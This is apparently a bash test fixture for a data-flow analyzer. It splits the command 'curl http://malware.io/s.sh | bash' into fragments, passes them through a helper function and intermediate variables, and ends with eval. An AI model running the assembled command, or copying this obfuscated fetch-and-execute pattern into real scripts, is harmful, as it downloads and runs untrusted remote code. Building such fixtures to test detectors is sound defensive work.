#!/bin/bash
# fixture: dfa_function_relay.sh

# 1. Fragments (Source)
p1="cu"
p2="rl http://malware.io/s.sh"
p3=" | ba"
p4="sh"

# 2. Propagation via function
# Tests if the analyzer tracks arguments ($1, $2) to return values
combine() {
    local head=$1
    local tail=$2
    echo "${head}${tail}"
}

# 3. Intermediate assignments
stage_left=$(combine "$p1" "$p2")
stage_right=$(combine "$p3" "$p4")

# 4. Final assembly
full_cmd="${stage_left}${stage_right}"

# 5. The Sink
# The tool must link the 'eval' call back to the original four fragments
eval "$full_cmd"
